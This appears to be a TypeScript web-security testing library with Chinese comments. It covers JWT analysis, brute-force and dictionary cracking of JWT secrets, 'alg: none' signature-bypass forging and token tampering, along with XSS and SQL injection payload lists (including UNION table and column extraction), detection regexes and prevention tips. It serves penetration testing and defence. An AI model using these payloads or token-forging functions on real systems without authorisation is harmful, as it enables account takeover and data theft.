/**
 * Web安全工具
 * 用于分析Web应用中的安全问题，包括JWT、Session、CSRF、XSS等漏洞
 */

import * as crypto from 'crypto';

export interface JWTClaims {
  iss?: string;  // Issuer
  sub?: string;  // Subject
  aud?: string;  // Audience
  exp?: number;  // Expiration time
  nbf?: number;  // Not before
  iat?: number;  // Issued at
  jti?: string;  // JWT ID
  [key: string]: any;  // Custom claims
}

export interface JWTHeader {
  alg: string;  // Algorithm
  typ: string;  // Token type
  kid?: string;  // Key ID
  [key: string]: any;  // Custom headers
}

export interface JWTToken {
  header: JWTHeader;
  payload: JWTClaims;
  signature: string;
  isExpired: boolean;
  isValid: boolean;
  errors: string[];
  vulnerabilities: string[]; // 检测到的漏洞
}

export interface JWTCrackResult {
  success: boolean;
  key?: string;
  attempts: number;
  time: number; // 耗时（毫秒）
  message: string;
}

export interface CSRFToken {
  token: string;
  isValid: boolean;
  issues: string[];
}

export interface XSSPayload {
  payload: string;
  type: 'stored' | 'reflected' | 'dom';
  effectiveness: 'high' | 'medium' | 'low';
  description: string;
}

export interface SQLInjectionPayload {
  payload: string;
  type: 'boolean-based' | 'error-based' | 'time-based' | 'union-based';
  effectiveness: 'high' | 'medium' | 'low';
  description: string;
  dbms: string[]; // 适用的数据库管理系统
}

export interface SQLInjectionResult {
  vulnerable: boolean;
  payload: string;
  type: string;
  dbms: string;
  confidence: 'high' | 'medium' | 'low';
  details: string;
}

export interface DatabaseInfo {
  type: string; // MySQL, PostgreSQL, SQLite, MSSQL, Oracle
  version?: string;
  tables?: string[];
  columns?: Record<string, string[]>;
}

/**
 * Web安全工具类
 */
export class WebSecurity {
  /**
   * 解析JWT令牌
   * @param token JWT令牌字符串
   * @returns 解析后的JWT令牌对象
   */
  static parseJWT(token: string): JWTToken {
    const errors: string[] = [];
    const vulnerabilities: string[] = [];
    
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        errors.push('JWT令牌格式错误，应该包含三个部分');
        return {
          header: {} as JWTHeader,
          payload: {} as JWTClaims,
          signature: '',
          isExpired: true,
          isValid: false,
          errors,
          vulnerabilities
        };
      }
      
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      const signature = parts[2];
      
      // 检查是否过期
      const isExpired = payload.exp && payload.exp < Math.floor(Date.now() / 1000);
      
      // 检查算法
      if (header.alg === 'none') {
        errors.push('JWT使用了none算法，这是不安全的');
        vulnerabilities.push('使用了none算法，签名可以被绕过');
      }
      
      // 检查关键声明
      if (!payload.exp) {
        errors.push('JWT缺少过期时间(exp)声明');
        vulnerabilities.push('缺少过期时间，令牌可能永久有效');
      }
      
      if (!payload.iat) {
        errors.push('JWT缺少发布时间(iat)声明');
      }
      
      // 检查令牌长度
      if (token.length < 50) {
        vulnerabilities.push('令牌长度过短，可能使用了弱密钥');
      }
      
      // 检查签名长度
      if (signature.length < 20) {
        vulnerabilities.push('签名长度过短，可能使用了弱算法或密钥');
      }
      
      // 检查算法安全性
      const weakAlgorithms = ['none', 'HS256', 'HS384', 'HS512'];
      if (weakAlgorithms.includes(header.alg)) {
        vulnerabilities.push(`使用了可能不安全的算法: ${header.alg}`);
      }
      
      // 检查是否包含敏感信息
      const sensitiveClaims = ['password', 'secret', 'token', 'key', 'credential'];
      for (const claim of sensitiveClaims) {
        if (Object.keys(payload).some(key => key.toLowerCase().includes(claim))) {
          vulnerabilities.push(`令牌中可能包含敏感信息: ${claim}`);
        }
      }
      
      return {
        header,
        payload,
        signature,
        isExpired,
        isValid: errors.length === 0,
        errors,
        vulnerabilities
      };
    } catch (error) {
      errors.push(`解析JWT时出错: ${(error as Error).message}`);
      return {
        header: {} as JWTHeader,
        payload: {} as JWTClaims,
        signature: '',
        isExpired: true,
        isValid: false,
        errors,
        vulnerabilities
      };
    }
  }

  /**
   * 验证JWT签名
   * @param token JWT令牌字符串
   * @param secret 密钥
   * @returns 是否有效
   */
  static verifyJWT(token: string, secret: string): boolean {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return false;
      }
      
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const signatureInput = `${parts[0]}.${parts[1]}`;
      const expectedSignature = crypto
        .createHmac(header.alg.replace('HS', 'sha'), secret)
        .update(signatureInput)
        .digest('base64url');
      
      return parts[2] === expectedSignature;
    } catch {
      return false;
    }
  }

  /**
   * 生成JWT令牌
   * @param payload 载荷
   * @param secret 密钥
   * @param options 选项
   * @returns JWT令牌字符串
   */
  static generateJWT(payload: JWTClaims, secret: string, options?: {
    algorithm?: string;
    expiresIn?: number;  // 过期时间（秒）
  }): string {
    const header = {
      alg: options?.algorithm || 'HS256',
      typ: 'JWT'
    };
    
    const now = Math.floor(Date.now() / 1000);
    const finalPayload = {
      ...payload,
      iat: now,
      exp: options?.expiresIn ? now + options.expiresIn : now + 3600  // 默认1小时
    };
    
    const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
    const encodedPayload = Buffer.from(JSON.stringify(finalPayload)).toString('base64url');
    const signatureInput = `${encodedHeader}.${encodedPayload}`;
    
    const signature = crypto
      .createHmac(header.alg.replace('HS', 'sha'), secret)
      .update(signatureInput)
      .digest('base64url');
    
    return `${encodedHeader}.${encodedPayload}.${signature}`;
  }

  /**
   * 分析CSRF令牌
   * @param token CSRF令牌
   * @returns CSRF令牌分析结果
   */
  static analyzeCSRFToken(token: string): CSRFToken {
    const issues: string[] = [];
    
    // 检查长度
    if (token.length < 16) {
      issues.push('CSRF令牌长度过短，可能不安全');
    }
    
    // 检查复杂度
    const hasLetters = /[a-zA-Z]/.test(token);
    const hasNumbers = /[0-9]/.test(token);
    const hasSpecial = /[^a-zA-Z0-9]/.test(token);
    
    if (!hasLetters || !hasNumbers) {
      issues.push('CSRF令牌复杂度不足，应该包含字母和数字');
    }
    
    // 检查随机性
    const entropy = this.calculateEntropy(token);
    if (entropy < 3.0) {
      issues.push('CSRF令牌熵值过低，可能不够随机');
    }
    
    return {
      token,
      isValid: issues.length === 0,
      issues
    };
  }

  /**
   * 生成XSS测试载荷
   * @param type XSS类型
   * @returns XSS测试载荷数组
   */
  static generateXSSPayloads(type: 'stored' | 'reflected' | 'dom'): XSSPayload[] {
    const payloads: XSSPayload[] = [];
    
    // 基础脚本标签
    payloads.push({
      payload: '<script>alert(1)</script>',
      type,
      effectiveness: 'high',
      description: '基础脚本标签注入'
    });
    
    // 事件处理器
    payloads.push({
      payload: '<img src=x onerror=alert(1)>',
      type,
      effectiveness: 'high',
      description: '图像错误事件处理器'
    });
    
    // SVG注入
    payloads.push({
      payload: '<svg onload=alert(1)>',
      type,
      effectiveness: 'medium',
      description: 'SVG加载事件处理器'
    });
    
    // 样式注入
    payloads.push({
      payload: '<style>@import\'javascript:alert(1)\';</style>',
      type,
      effectiveness: 'low',
      description: '样式导入注入'
    });
    
    if (type === 'dom') {
      // DOM XSS特定载荷
      payloads.push({
        payload: 'javascript:alert(1)',
        type,
        effectiveness: 'high',
        description: 'JavaScript URL注入'
      });
    }
    
    return payloads;
  }

  /**
   * 生成增强的XSS测试载荷
   * @param type XSS类型
   * @returns 增强的XSS测试载荷数组
   */
  static generateEnhancedXSSPayloads(type: 'stored' | 'reflected' | 'dom'): XSSPayload[] {
    const payloads: XSSPayload[] = [];
    
    // 基础脚本注入
    payloads.push({
      payload: '<script>alert(1)</script>',
      type,
      effectiveness: 'high',
      description: '基础脚本标签注入'
    });
    
    // 事件处理器注入
    payloads.push({
      payload: '<img src=x onerror=alert(1)>',
      type,
      effectiveness: 'high',
      description: '图像错误事件处理器'
    });
    
    // 多事件处理器
    payloads.push({
      payload: '<div onmouseover=alert(1) onfocus=alert(2) onload=alert(3)>Hover or click me</div>',
      type,
      effectiveness: 'high',
      description: '多事件处理器注入'
    });
    
    // SVG注入
    payloads.push({
      payload: '<svg onload=alert(1)>',
      type,
      effectiveness: 'medium',
      description: 'SVG加载事件处理器'
    });
    
    // 复杂SVG注入
    payloads.push({
      payload: '<svg><script>alert(1)</script></svg>',
      type,
      effectiveness: 'high',
      description: 'SVG内部脚本注入'
    });
    
    // 样式注入
    payloads.push({
      payload: '<style>@import\'javascript:alert(1)\';</style>',
      type,
      effectiveness: 'low',
      description: '样式导入注入'
    });
    
    // CSS表达式注入 (IE)
    payloads.push({
      payload: '<div style=expression(alert(1))>',
      type,
      effectiveness: 'low',
      description: 'CSS表达式注入 (IE专用)'
    });
    
    // JavaScript URL
    payloads.push({
      payload: '<a href=javascript:alert(1)>Click me</a>',
      type,
      effectiveness: 'medium',
      description: 'JavaScript URL注入'
    });
    
    // 编码绕过
    payloads.push({
      payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
      type,
      effectiveness: 'medium',
      description: 'HTML实体编码绕过'
    });
    
    // 引号绕过
    payloads.push({
      payload: '<img src=x onerror=alert(1)>',
      type,
      effectiveness: 'high',
      description: '无引号事件处理器'
    });
    
    // 分号绕过
    payloads.push({
      payload: '<img src=x onerror=alert`1`>',
      type,
      effectiveness: 'medium',
      description: '反引号绕过'
    });
    
    // DOM XSS特定载荷
    if (type === 'dom') {
      payloads.push({
        payload: 'javascript:alert(1)',
        type,
        effectiveness: 'high',
        description: 'JavaScript URL注入'
      });
      
      payloads.push({
        payload: 'data:text/html,<script>alert(1)</script>',
        type,
        effectiveness: 'high',
        description: 'Data URI注入'
      });
      
      payloads.push({
        payload: 'vbscript:msgbox(1)',
        type,
        effectiveness: 'low',
        description: 'VBScript URL注入 (IE专用)'
      });
    }
    
    // 存储型XSS特定载荷
    if (type === 'stored') {
      payloads.push({
        payload: '<iframe src="javascript:alert(1)"></iframe>',
        type,
        effectiveness: 'high',
        description: 'iframe JavaScript URL注入'
      });
      
      payloads.push({
        payload: '<object data="javascript:alert(1)"></object>',
        type,
        effectiveness: 'medium',
        description: 'object标签注入'
      });
    }
    
    // 反射型XSS特定载荷
    if (type === 'reflected') {
      payloads.push({
        payload: '%3Cscript%3Ealert(1)%3C/script%3E',
        type,
        effectiveness: 'high',
        description: 'URL编码的脚本标签'
      });
      
      payloads.push({
        payload: '" onclick=alert(1)',
        type,
        effectiveness: 'high',
        description: 'HTML属性闭合注入'
      });
      
      payloads.push({
        payload: '\'><script>alert(1)</script>',
        type,
        effectiveness: 'high',
        description: 'HTML标签闭合注入'
      });
    }
    
    return payloads;
  }

  /**
   * 检测HTML中的XSS漏洞
   * @param html HTML字符串
   * @returns 检测到的XSS漏洞列表
   */
  static detectXSS(html: string): XSSPayload[] {
    const vulnerabilities: XSSPayload[] = [];
    
    // 检测脚本标签
    if (/<script[^>]*>.*?<\/script>/gi.test(html)) {
      vulnerabilities.push({
        payload: '<script>alert(1)</script>',
        type: 'stored',
        effectiveness: 'high',
        description: '检测到脚本标签注入'
      });
    }
    
    // 检测事件处理器
    if (/<[^>]*on\w+\s*=\s*['"](?:javascript:)?[^'"]*['"]/gi.test(html)) {
      vulnerabilities.push({
        payload: '<img src=x onerror=alert(1)>',
        type: 'stored',
        effectiveness: 'high',
        description: '检测到事件处理器注入'
      });
    }
    
    // 检测JavaScript URL
    if (/href\s*=\s*['"]javascript:[^'"]*['"]/gi.test(html)) {
      vulnerabilities.push({
        payload: '<a href=javascript:alert(1)>Click</a>',
        type: 'stored',
        effectiveness: 'medium',
        description: '检测到JavaScript URL注入'
      });
    }
    
    return vulnerabilities;
  }

  /**
   * 分析会话管理安全性
   * @param cookies Cookie字符串
   * @returns 安全问题列表
   */
  static analyzeSessionManagement(cookies: string): string[] {
    const issues: string[] = [];
    
    if (!cookies) {
      issues.push('未检测到Cookie，可能使用了其他会话管理机制');
      return issues;
    }
    
    const cookieParts = cookies.split('; ');
    
    // 查找会话Cookie
    let sessionCookieFound = false;
    for (const cookie of cookieParts) {
      const [name, value] = cookie.split('=');
      
      // 常见会话Cookie名称
      const sessionCookieNames = ['session', 'token', 'auth', 'sid', 'sessionid', 'PHPSESSID', 'JSESSIONID'];
      if (sessionCookieNames.some(suffix => name.toLowerCase().includes(suffix))) {
        sessionCookieFound = true;
        
        // 检查Cookie长度
        if (value.length < 16) {
          issues.push(`会话Cookie ${name} 长度过短，可能不安全`);
        }
        
        // 检查Cookie复杂度
        const hasLetters = /[a-zA-Z]/.test(value);
        const hasNumbers = /[0-9]/.test(value);
        if (!hasLetters || !hasNumbers) {
          issues.push(`会话Cookie ${name} 复杂度不足，应该包含字母和数字`);
        }
      }
    }
    
    if (!sessionCookieFound) {
      issues.push('未检测到明显的会话Cookie');
    }
    
    return issues;
  }

  /**
   * 计算字符串熵值
   * @param str 字符串
   * @returns 熵值
   */
  private static calculateEntropy(str: string): number {
    const charCount: Record<string, number> = {};
    for (const char of str) {
      charCount[char] = (charCount[char] || 0) + 1;
    }
    
    let entropy = 0;
    const length = str.length;
    for (const count of Object.values(charCount)) {
      const probability = count / length;
      entropy -= probability * Math.log2(probability);
    }
    
    return entropy;
  }

  /**
   * 检测SQL注入漏洞
   * @param input 用户输入
   * @returns 是否可能存在SQL注入
   */
  static detectSQLInjection(input: string): boolean {
    const sqlInjectionPatterns = [
      /'\s*OR\s*'1'\s*=\s*'1/gi,
      /'\s*AND\s*'1'\s*=\s*'1/gi,
      /\s*OR\s*1\s*=\s*1/gi,
      /\s*AND\s*1\s*=\s*1/gi,
      /'\s*;\s*--/gi,
      /'\s*DROP\s+TABLE/gi,
      /'\s*UNION\s+SELECT/gi,
      /'\s*INSERT\s+INTO/gi,
      /'\s*UPDATE\s+SET/gi,
      /'\s*DELETE\s+FROM/gi
    ];
    
    return sqlInjectionPatterns.some(pattern => pattern.test(input));
  }

  /**
   * 生成SQL注入测试载荷
   * @returns SQL注入测试载荷数组
   */
  static generateSQLInjectionPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' AND '1'='1",
      "' OR 1=1 --",
      "' AND 1=1 --",
      "' UNION SELECT 1,2,3 --",
      "' OR 1=1#",
      "' AND 1=1#",
      '" OR "1"="1"',
      '" AND "1"="1"',
      '" OR 1=1 --"',
      '" AND 1=1 --"'
    ];
  }

  /**
   * 生成增强的SQL注入测试载荷
   * @returns 增强的SQL注入测试载荷数组
   */
  static generateEnhancedSQLInjectionPayloads(): SQLInjectionPayload[] {
    return [
      {
        payload: "' OR '1'='1",
        type: 'boolean-based',
        effectiveness: 'high',
        description: '基础布尔型SQL注入',
        dbms: ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle', 'SQLite']
      },
      {
        payload: "' OR 1=1 --",
        type: 'boolean-based',
        effectiveness: 'high',
        description: '带注释的布尔型SQL注入',
        dbms: ['MySQL', 'PostgreSQL', 'MSSQL']
      },
      {
        payload: "' OR 1=1#",
        type: 'boolean-based',
        effectiveness: 'high',
        description: '带井号注释的布尔型SQL注入',
        dbms: ['MySQL']
      },
      {
        payload: "' UNION SELECT 1,2,3 --",
        type: 'union-based',
        effectiveness: 'high',
        description: '联合查询SQL注入',
        dbms: ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']
      },
      {
        payload: "' AND (SELECT COUNT(*) FROM users) > 0 --",
        type: 'boolean-based',
        effectiveness: 'medium',
        description: '基于查询的布尔型SQL注入',
        dbms: ['MySQL', 'PostgreSQL', 'MSSQL', 'Oracle']
      },
      {
        payload: "' AND SLEEP(5) --",
        type: 'time-based',
        effectiveness: 'medium',
        description: '基于时间的SQL注入（MySQL）',
        dbms: ['MySQL']
      },
      {
        payload: "' AND pg_sleep(5) --",
        type: 'time-based',
        effectiveness: 'medium',
        description: '基于时间的SQL注入（PostgreSQL）',
        dbms: ['PostgreSQL']
      },
      {
        payload: "' AND WAITFOR DELAY '0:0:5' --",
        type: 'time-based',
        effectiveness: 'medium',
        description: '基于时间的SQL注入（MSSQL）',
        dbms: ['MSSQL']
      },
      {
        payload: "' AND 1=CONVERT(int, (SELECT @@version)) --",
        type: 'error-based',
        effectiveness: 'high',
        description: '基于错误的SQL注入（MSSQL）',
        dbms: ['MSSQL']
      },
      {
        payload: "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
        type: 'error-based',
        effectiveness: 'high',
        description: '基于错误的SQL注入（MySQL/Oracle）',
        dbms: ['MySQL', 'Oracle']
      }
    ];
  }

  /**
   * 检测SQL注入漏洞并识别数据库类型
   * @param input 用户输入
   * @returns SQL注入检测结果
   */
  static detectSQLInjectionWithDB(input: string): SQLInjectionResult {
    const results: SQLInjectionResult[] = [];
    
    // 检测布尔型注入
    const booleanPatterns = [
      /'\s*OR\s*'1'\s*=\s*'1/gi,
      /'\s*AND\s*'1'\s*=\s*'1/gi,
      /\s*OR\s*1\s*=\s*1/gi,
      /\s*AND\s*1\s*=\s*1/gi
    ];
    
    // 检测联合查询注入
    const unionPatterns = [
      /'\s*UNION\s+SELECT/gi,
      /"\s*UNION\s+SELECT/gi
    ];
    
    // 检测基于时间的注入
    const timePatterns = [
      /SLEEP\(\d+\)/gi,
      /pg_sleep\(\d+\)/gi,
      /WAITFOR\s+DELAY/gi
    ];
    
    // 检测基于错误的注入
    const errorPatterns = [
      /EXTRACTVALUE/gi,
      /CONVERT\(int,/gi,
      /CAST\(.*AS\s+int\)/gi
    ];
    
    // 检测数据库特定语法
    let dbms = 'Unknown';
    if (/SLEEP\(\d+\)/gi.test(input)) dbms = 'MySQL';
    else if (/pg_sleep\(\d+\)/gi.test(input)) dbms = 'PostgreSQL';
    else if (/WAITFOR\s+DELAY/gi.test(input)) dbms = 'MSSQL';
    else if (/EXTRACTVALUE/gi.test(input)) dbms = 'MySQL/Oracle';
    
    // 检测注入类型
    let injectionType = 'Unknown';
    if (booleanPatterns.some(pattern => pattern.test(input))) {
      injectionType = 'boolean-based';
    } else if (unionPatterns.some(pattern => pattern.test(input))) {
      injectionType = 'union-based';
    } else if (timePatterns.some(pattern => pattern.test(input))) {
      injectionType = 'time-based';
    } else if (errorPatterns.some(pattern => pattern.test(input))) {
      injectionType = 'error-based';
    }
    
    const vulnerable = this.detectSQLInjection(input);
    
    return {
      vulnerable,
      payload: input,
      type: injectionType,
      dbms,
      confidence: vulnerable ? 'high' : 'low',
      details: vulnerable ? `检测到${injectionType}类型的SQL注入，可能的数据库: ${dbms}` : '未检测到SQL注入'
    };
  }

  /**
   * 生成SQL注入数据库指纹识别载荷
   * @returns 数据库指纹识别载荷数组
   */
  static generateDBFingerprintPayloads(): Array<{ payload: string; dbms: string; description: string }> {
    return [
      {
        payload: "' AND @@version --",
        dbms: 'MySQL',
        description: 'MySQL版本检测'
      },
      {
        payload: "' AND version() --",
        dbms: 'MySQL/PostgreSQL',
        description: 'MySQL/PostgreSQL版本检测'
      },
      {
        payload: "' AND pg_version() --",
        dbms: 'PostgreSQL',
        description: 'PostgreSQL版本检测'
      },
      {
        payload: "' AND @@SERVERNAME --",
        dbms: 'MSSQL',
        description: 'MSSQL服务器名称检测'
      },
      {
        payload: "' AND banner FROM v$version --",
        dbms: 'Oracle',
        description: 'Oracle版本检测'
      },
      {
        payload: "' AND sqlite_version() --",
        dbms: 'SQLite',
        description: 'SQLite版本检测'
      }
    ];
  }

  /**
   * 生成SQL注入表名提取载荷
   * @returns 表名提取载荷数组
   */
  static generateTableExtractionPayloads(): Array<{ payload: string; dbms: string; description: string }> {
    return [
      {
        payload: "' UNION SELECT table_name,1 FROM information_schema.tables --",
        dbms: 'MySQL/PostgreSQL/MSSQL',
        description: '从information_schema.tables提取表名'
      },
      {
        payload: "' UNION SELECT name,1 FROM sqlite_master WHERE type='table' --",
        dbms: 'SQLite',
        description: '从sqlite_master提取表名'
      },
      {
        payload: "' UNION SELECT table_name,1 FROM user_tables --",
        dbms: 'Oracle',
        description: '从user_tables提取表名'
      }
    ];
  }

  /**
   * 生成SQL注入列名提取载荷
   * @param tableName 表名
   * @returns 列名提取载荷数组
   */
  static generateColumnExtractionPayloads(tableName: string): Array<{ payload: string; dbms: string; description: string }> {
    return [
      {
        payload: `' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='${tableName}' --`,
        dbms: 'MySQL/PostgreSQL/MSSQL',
        description: `从information_schema.columns提取${tableName}表的列名`
      },
      {
        payload: `' UNION SELECT sql,1 FROM sqlite_master WHERE type='table' AND name='${tableName}' --`,
        dbms: 'SQLite',
        description: `从sqlite_master提取${tableName}表的结构`
      },
      {
        payload: `' UNION SELECT column_name,1 FROM user_tab_columns WHERE table_name='${tableName}' --`,
        dbms: 'Oracle',
        description: `从user_tab_columns提取${tableName}表的列名`
      }
    ];
  }

  /**
   * 提供SQL注入防护建议
   * @returns SQL注入防护建议
   */
  static getSQLInjectionPreventionTips(): string[] {
    return [
      '使用参数化查询（Prepared Statements）',
      '使用存储过程',
      '实施输入验证和过滤',
      '使用最小权限原则',
      '实施WAF（Web应用防火墙）',
      '定期更新数据库和应用程序',
      '进行安全代码审查',
      '使用ORM框架（如Hibernate、Django ORM等）',
      '实施输入长度限制',
      '对特殊字符进行转义'
    ];
  }

  /**
   * 分析SQL查询的安全性
   * @param query SQL查询字符串
   * @returns 安全分析结果
   */
  static analyzeSQLQuerySecurity(query: string): { safe: boolean; issues: string[] } {
    const issues: string[] = [];
    
    // 检测字符串拼接
    if (/\s*\+\s*'/gi.test(query) || /\s*\+\s*"/gi.test(query)) {
      issues.push('检测到字符串拼接，可能存在SQL注入风险');
    }
    
    // 检测未参数化的输入
    if (/\@\w+/gi.test(query) && !/prepare|execute/i.test(query)) {
      issues.push('检测到变量直接嵌入SQL，建议使用参数化查询');
    }
    
    // 检测危险的SQL函数
    const dangerousFunctions = ['EXEC', 'xp_', 'sp_', 'LOAD_FILE', 'INTO OUTFILE'];
    dangerousFunctions.forEach(func => {
      if (new RegExp(func, 'gi').test(query)) {
        issues.push(`检测到危险的SQL函数: ${func}`);
      }
    });
    
    return {
      safe: issues.length === 0,
      issues
    };
  }

  /**
   * 提供XSS防护建议
   * @returns XSS防护建议
   */
  static getXSSPreventionTips(): string[] {
    return [
      '对输入进行验证和过滤',
      '对输出进行HTML转义',
      '使用内容安全策略（CSP）',
      '实施HTTP-only Cookie',
      '使用现代前端框架的自动转义功能',
      '对富文本内容使用HTML净化库',
      '实施输入长度限制',
      '定期进行安全测试',
      '保持Web应用框架和库的更新',
      '使用X-XSS-Protection头部'
    ];
  }

  /**
   * 分析HTML内容的安全性
   * @param html HTML字符串
   * @returns 安全分析结果
   */
  static analyzeHTMLSecurity(html: string): { safe: boolean; vulnerabilities: XSSPayload[] } {
    const vulnerabilities = this.detectXSS(html);
    return {
      safe: vulnerabilities.length === 0,
      vulnerabilities
    };
  }

  /**
   * 暴力破解JWT密钥（仅适用于弱密钥）
   * @param token JWT令牌字符串
   * @param charset 字符集
   * @param minLength 最小长度
   * @param maxLength 最大长度
   * @param maxAttempts 最大尝试次数
   * @returns 破解结果
   */
  static bruteForceJWT(token: string, charset: string = 'abcdefghijklmnopqrstuvwxyz0123456789', minLength: number = 1, maxLength: number = 4, maxAttempts: number = 100000): JWTCrackResult {
    const startTime = Date.now();
    let attempts = 0;
    
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return {
          success: false,
          attempts: 0,
          time: Date.now() - startTime,
          message: 'JWT令牌格式错误'
        };
      }
      
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const signatureInput = `${parts[0]}.${parts[1]}`;
      
      // 生成所有可能的密钥组合
      const generateKeys = (length: number): string[] => {
        if (length === 0) return [''];
        const keys = [];
        const prevKeys = generateKeys(length - 1);
        for (const key of prevKeys) {
          for (const char of charset) {
            keys.push(key + char);
            attempts++;
            if (attempts >= maxAttempts) {
              return keys;
            }
          }
        }
        return keys;
      };
      
      // 从最小长度到最大长度尝试
      for (let length = minLength; length <= maxLength; length++) {
        const keys = generateKeys(length);
        for (const key of keys) {
          try {
            const expectedSignature = crypto
              .createHmac(header.alg.replace('HS', 'sha'), key)
              .update(signatureInput)
              .digest('base64url');
            
            if (parts[2] === expectedSignature) {
              return {
                success: true,
                key,
                attempts,
                time: Date.now() - startTime,
                message: `成功破解JWT密钥: ${key}`
              };
            }
          } catch {
            // 忽略无效的密钥
          }
          
          if (attempts >= maxAttempts) {
            break;
          }
        }
        
        if (attempts >= maxAttempts) {
          break;
        }
      }
      
      return {
        success: false,
        attempts,
        time: Date.now() - startTime,
        message: '暴力破解失败，未找到密钥'
      };
    } catch (error) {
      return {
        success: false,
        attempts,
        time: Date.now() - startTime,
        message: `破解过程中出错: ${(error as Error).message}`
      };
    }
  }

  /**
   * 字典破解JWT密钥
   * @param token JWT令牌字符串
   * @param wordlist 字典数组
   * @returns 破解结果
   */
  static dictionaryCrackJWT(token: string, wordlist: string[]): JWTCrackResult {
    const startTime = Date.now();
    let attempts = 0;
    
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return {
          success: false,
          attempts: 0,
          time: Date.now() - startTime,
          message: 'JWT令牌格式错误'
        };
      }
      
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const signatureInput = `${parts[0]}.${parts[1]}`;
      
      for (const key of wordlist) {
        attempts++;
        try {
          const expectedSignature = crypto
            .createHmac(header.alg.replace('HS', 'sha'), key)
            .update(signatureInput)
            .digest('base64url');
          
          if (parts[2] === expectedSignature) {
            return {
              success: true,
              key,
              attempts,
              time: Date.now() - startTime,
              message: `成功破解JWT密钥: ${key}`
            };
          }
        } catch {
          // 忽略无效的密钥
        }
      }
      
      return {
        success: false,
        attempts,
        time: Date.now() - startTime,
        message: '字典破解失败，未找到密钥'
      };
    } catch (error) {
      return {
        success: false,
        attempts,
        time: Date.now() - startTime,
        message: `破解过程中出错: ${(error as Error).message}`
      };
    }
  }

  /**
   * 生成JWT签名绕过载荷
   * @param token JWT令牌字符串
   * @returns 签名绕过的JWT令牌
   */
  static generateJWTSignatureBypass(token: string): string {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return token;
      }
      
      // 修改算法为none
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      header.alg = 'none';
      
      const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
      
      // 移除签名部分
      return `${encodedHeader}.${parts[1]}.`;
    } catch {
      return token;
    }
  }

  /**
   * 篡改JWT令牌
   * @param token JWT令牌字符串
   * @param modifications 要修改的声明
   * @param secret 密钥
   * @returns 修改后的JWT令牌
   */
  static tamperJWT(token: string, modifications: Record<string, any>, secret: string): string {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) {
        return token;
      }
      
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      
      // 应用修改
      const modifiedPayload = { ...payload, ...modifications };
      
      const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
      const encodedPayload = Buffer.from(JSON.stringify(modifiedPayload)).toString('base64url');
      const signatureInput = `${encodedHeader}.${encodedPayload}`;
      
      const signature = crypto
        .createHmac(header.alg.replace('HS', 'sha'), secret)
        .update(signatureInput)
        .digest('base64url');
      
      return `${encodedHeader}.${encodedPayload}.${signature}`;
    } catch {
      return token;
    }
  }

  /**
   * 获取常见的JWT弱密钥字典
   * @returns 弱密钥数组
   */
  static getCommonJWTSecrets(): string[] {
    return [
      'secret', 'password', '123456', 'token', 'jwt', 'key',
      'secret123', 'password123', '12345678', 'admin', 'default',
      'test', 'development', 'production', 'api', 'auth',
      'secure', 'secretkey', 'password123456', '123456789', 'qwerty',
      'abc123', '123123', 'admin123', 'root', 'toor',
      'pass', 'pass123', 'welcome', 'hello', 'world'
    ];
  }
}


export default WebSecurity;
